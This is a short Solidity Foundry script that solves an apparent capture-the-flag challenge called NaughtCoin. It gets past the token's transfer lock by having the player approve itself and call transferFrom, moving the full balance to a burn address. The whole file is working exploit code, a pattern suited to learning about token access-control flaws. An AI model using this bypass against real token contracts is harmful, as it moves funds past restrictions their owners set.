// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { NaughtCoin } from "src/NaughtCoin/NaughtCoin.sol";

contract NaughtCoinAttackScript is Script {
    address naughtCoinInstance = address(0x333B24977AB1AF10619A689c07924709CEf4EdCB);
    address playerAddress = address(0x5243d93bCdC8941Aa4b925c712128ba4933007C0); // thats-a-me!

    function run() public {
        vm.startBroadcast();
        NaughtCoin(naughtCoinInstance).approve(playerAddress, NaughtCoin(naughtCoinInstance).balanceOf(playerAddress));
        NaughtCoin(naughtCoinInstance).transferFrom(
            playerAddress,
            address(0xdead),
            NaughtCoin(naughtCoinInstance).balanceOf(playerAddress)
        );

        // affirm that we have transferred the tokens out
        assert(NaughtCoin(naughtCoinInstance).balanceOf(playerAddress) == 0);
        vm.stopBroadcast();
    }
}
